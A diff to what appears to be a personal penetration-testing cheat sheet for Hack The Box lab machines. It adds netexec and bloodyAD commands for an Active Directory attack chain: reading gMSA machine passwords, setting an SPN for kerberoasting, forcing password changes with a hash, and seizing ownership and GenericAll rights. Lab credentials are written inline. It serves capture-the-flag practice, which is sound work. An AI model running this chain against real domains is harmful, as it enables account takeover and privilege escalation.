@@ -789,8 +789,8 @@ netexec winrm  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303'
 # auth with ldap  
 netexec ldap  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' 
 
-# list shares 
-netexec smb  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303'  --shares
+# list users 
+netexec smb  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303'  --users
 
 # list shares 
 netexec smb  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' --shares
@@ -800,6 +800,9 @@ netexec ldap   dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303'  --kerberoastin
 
 # run ADCS modules  
 netexec ldap  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' -M adcs
+
+# p.agila have ReadGMSAPassword permission can reed password of machine account 
+netexec ldap  dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' --gmsa
 
 ```
 ## certipy
@@ -823,6 +826,21 @@ certipy shadow auto -u p.agila@fluffy.htb -p prometheusx-303 -account winrm_svc
 ```
 # adding the p.agila user to the Service Accounts group
 bloodyAD -u p.agila -p prometheusx-303 -d fluffy.htb --host dc01.fluffy.htb add groupMember 'service accounts' p.agila
+
+# adding a SPN to alfred to get kerberoas to have a hash  alfred  ( henry need have  WriteSPN to alfred ) 
+bloodyAD -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' --host dc01.tombwatcher.htb set object alfred servicePrincipalName -v 'http/whatever'
+
+# alfred have ReadGMSAPassword permission can reed password of machine account 'ANSIBLE_DEV$'
+bloodyAD -d tombwatcher.htb -u alfred -p basketball --host dc01.tombwatcher.htb get object 'ANSIBLE_DEV$' --attr msDS-ManagedPassword
+
+# change password sam  ( ANSIBLE_DEV$ need have ForceChangePassword permission ) 
+bloodyAD -d tombwatcher.htb -u 'ANSIBLE_DEV$' -p ':1c37d00093dc2a5f25176bf2d474afdc' --host dc01.tombwatcher.htb set password "sam" "0xdf0xdf!"
+
+# setting the owner of John to Sam  ( Sam need have WriteOwner permission )
+bloodyAD -d tombwatcher.htb -u sam -p '0xdf0xdf!' --host dc01.tombwatcher.htb set owner john sam
+
+# give Sam GenericAll over John  ( Sam need have owner permission to John )
+bloodyAD -d tombwatcher.htb -u sam -p '0xdf0xdf!' --host dc01.tombwatcher.htb add genericAll john sam
 
 
 
